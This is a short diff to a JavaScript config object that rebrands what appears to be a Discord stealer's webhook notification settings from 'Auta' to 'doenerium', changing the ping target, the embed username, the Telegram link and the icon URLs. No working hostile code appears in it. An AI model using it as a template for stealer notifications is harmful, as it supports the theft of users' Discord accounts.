@@ -20,16 +20,16 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@Auta"],
+    ping: [true, "@doener"],
 
     embed: {
-        username: "Auta",
+        username: "doenerium | t.me/doenerium",
         footer: {
-            text: `Auta`,
-            icon_url: "https://media.discordapp.net/attachments/1038458525539651694/1061257138112045066/file.png?width=684&height=462",
+            text: `doenerium | t.me/doenerium`,
+            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "Auta",
-        avatar_url: "https://media.discordapp.net/attachments/1038458525539651694/1061257138112045066/file.png?width=684&height=462"
+        href: "https://t.me/doenerium",
+        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
     badges: {
